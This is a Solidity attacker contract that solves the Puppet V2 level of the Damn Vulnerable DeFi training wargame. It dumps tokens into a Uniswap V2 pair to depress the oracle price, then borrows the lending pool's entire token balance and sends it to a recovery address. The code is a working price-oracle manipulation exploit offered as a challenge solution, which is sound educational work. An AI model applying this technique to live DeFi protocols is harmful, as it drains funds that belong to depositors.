// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {console} from "forge-std/console.sol";

contract AttackerV2 {
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    address recovery;
    WETH weth;
    DamnValuableToken token;
    IUniswapV2Router02 uniswapV2Router;
    PuppetV2Pool lendingPool;

    constructor(
        WETH _weth,
        DamnValuableToken _token,
        IUniswapV2Router02 _uniswapV2Router,
        PuppetV2Pool _lendingPool,
        address _recovery
    ) {
        weth = _weth;
        token = _token;
        uniswapV2Router = _uniswapV2Router;
        lendingPool = _lendingPool;
        recovery = _recovery;
    }

    function attack() external {
        token.approve(address(uniswapV2Router), type(uint256).max);

        address[] memory tokeArray = new address[](2);
        tokeArray[0] = address(token);
        tokeArray[1] = address(weth);

        IUniswapV2Router02(uniswapV2Router).swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE, //amountIn
            0, // accept any amount of WETH
            tokeArray, // path
            address(this), // recipient
            block.timestamp + 100
        );

        weth.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        // Transfer token balance to the recovery address
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
